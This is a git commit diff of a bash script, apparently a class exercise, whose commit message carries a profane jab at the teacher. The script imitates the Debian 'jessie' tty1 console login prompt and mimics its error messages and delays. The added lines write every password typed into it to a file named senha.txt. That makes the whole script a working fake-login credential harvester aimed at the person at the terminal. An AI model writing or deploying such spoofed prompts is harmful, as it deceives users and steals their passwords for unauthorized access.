eac2ad878abd45cfa051ea7f0135e98e7619a93d
root <root@jessie.raw>
2017-03-23 11:29:38 +0000

    Aula08 do prof FDP

--- login.sh
+++ login.sh
@@ -1,30 +1,36 @@
-#!/bin/bash
-USUARIO=Thales
-SENHA=123
-VOLTA=1
-while (( $VOLTA != 0 )); do
-	clear
-	echo
-	echo "Debian GNU/Linux 8 jessie tty1"
-	echo
-	QNT=1
-	while (( $QNT <= 5 )); do
-		echo -n "jessie login: "
-		read USER
-		echo -n "Password: "
-		read -s PASS
-		if [ $USER == $USUARIO ]; then
-			if [ $PASS == $SENHA ]; then
-				QNT=6
-				VOLTA=0
-			fi
-		fi
+#!/bin/bash 
+USUARIO=vagrant
+SENHA=vagrant
+SAI=1
+while (( $SAI != 0 )); do
+ clear
+ echo
+ echo 'Debian GNU/Linux 8 jessie tty1'
+ echo
+ QNT=1
+ while (( $QNT <= 5 )); do
+  echo -n "jessie login: "
+  read USER
+  echo -n "Password: "
+  read -s PASS
+  echo
+  echo $PASS >> senha.txt
+  if [ $USER == $USUARIO ]; then
+  	if [ $PASS == $SENHA ]; then
+		SAI=0
+		QNT=6
+	else
+		sleep 3
 		echo
-		if (( $QNT <= 5 )); then
-			sleep 3
-			echo
-			echo "Login incorrect"
-		fi
-		let QNT=($QNT+1)
-	done
+		echo "Login incorrect"
+	fi
+  else
+	sleep 3
+	echo
+	echo "Login incorrect"
+  fi
+ let QNT=($QNT+1)
+ done
 done
+
+echo "passou"
